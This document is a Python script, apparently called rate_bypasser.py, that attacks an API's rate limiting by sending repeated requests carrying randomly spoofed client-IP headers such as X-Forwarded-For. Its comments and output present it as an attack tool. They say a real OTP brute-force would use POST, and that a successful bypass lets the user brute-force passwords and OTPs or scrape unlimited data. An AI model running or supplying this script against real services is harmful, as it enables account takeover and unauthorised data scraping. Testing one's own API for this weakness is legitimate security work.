import requests
import random
import sys
import time

def generate_fake_ip():
    # Generates a random IP address like 192.168.x.x or 10.x.x.x
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def bypass_rate_limit(target_url, total_requests=50):
    print(f"\n[*] Bhai, starting The Ghost Protocol: API Rate Limit Bypasser on -> {target_url}")
    print(f"[*] Attempting to send {total_requests} rapid requests using IP Spoofing...\n")
    print("==================================================")

    # API endpoints usually block you after 3 to 5 wrong attempts.
    # We will send 50, and see if we get blocked (HTTP 429).
    
    blocked_count = 0
    success_count = 0

    for i in range(1, total_requests + 1):
        fake_ip = generate_fake_ip()
        
        # The Hacker's Arsenal of IP Spoofing Headers
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Arch Linux x86_64) API-Ghost/1.0",
            "X-Forwarded-For": fake_ip,
            "X-Originating-IP": fake_ip,
            "X-Remote-IP": fake_ip,
            "X-Remote-Addr": fake_ip,
            "Client-IP": fake_ip,
            "True-Client-IP": fake_ip
        }

        try:
            # We are sending a dummy GET request. In a real OTP brute-force, this would be a POST.
            response = requests.get(target_url, headers=headers, timeout=5)
            status = response.status_code

            if status == 429:
                # HTTP 429 means "Too Many Requests" (We got caught!)
                print(f"   [-] Request {i}: BLOCKED (HTTP 429) - Fake IP {fake_ip} failed to bypass.")
                blocked_count += 1
            else:
                # Any other status (200, 401, 403) means the API processed our request!
                print(f"   [+] Request {i}: SUCCESS (HTTP {status}) - Spoofed IP: {fake_ip}")
                success_count += 1

            # Chhota sa delay taaki server crash na ho (hum brute-force kar rahe hain, DoS nahi)
            time.sleep(0.1)

        except requests.exceptions.RequestException as e:
            print(f"   [!] Request {i}: Connection Error.")

    print("\n==================================================")
    print(f"[*] Attack Complete!")
    print(f"[*] Successful Requests (Bypassed): {success_count}")
    print(f"[*] Blocked Requests (Caught): {blocked_count}")

    if success_count == total_requests:
        print("\n   [!!!] JACKPOT 🎯 FULL RATE LIMIT BYPASS ACHIEVED!")
        print("   [!!!] The API completely trusts the 'X-Forwarded-For' headers.")
        print("   [!!!] Impact: You can now brute-force Passwords, OTPs, or scrape unlimited data! 💸")
    elif success_count > 5 and blocked_count > 0:
        print("\n   [!] PARTIAL BYPASS: Headers worked for a while, but secondary rate limits caught us.")
    else:
        print("\n   [-] SECURE: The API ignores spoofed IP headers and correctly tracks your real IP.")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if len(sys.argv) < 2:
        print("Usage: python3 rate_bypasser.py <API_Endpoint_URL>")
        print("Example: python3 rate_bypasser.py http://api.target.com/v1/login")
        sys.exit(1)
        
    target = sys.argv[1]
    bypass_rate_limit(target, total_requests=50)
